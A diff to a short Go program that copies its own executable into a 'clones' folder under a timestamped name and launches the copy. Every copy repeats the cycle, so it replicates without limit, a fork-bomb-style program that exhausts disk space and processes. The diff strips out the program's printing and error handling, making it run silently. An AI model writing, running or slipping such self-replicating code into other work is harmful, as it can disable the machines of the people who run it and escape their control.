@@ -10,21 +10,10 @@ import (
 
 func main() {
 	exe, _ := os.Executable()
-	fmt.Println(exe)
-	input, err := ioutil.ReadFile(exe)
-	if err != nil {
-		fmt.Println(err)
-		return
-	}
+	input, _ := ioutil.ReadFile(exe)
 
 	destinationFile := fmt.Sprintf("clones/%d", time.Now().Unix())
-	err = ioutil.WriteFile(destinationFile, input, 0755)
-	if err != nil {
-		fmt.Println("Error creating", destinationFile)
-		fmt.Println(err)
-		return
-	}
+	ioutil.WriteFile(destinationFile, input, 0755)
 
 	exec.Command(destinationFile).Start()
-
 }
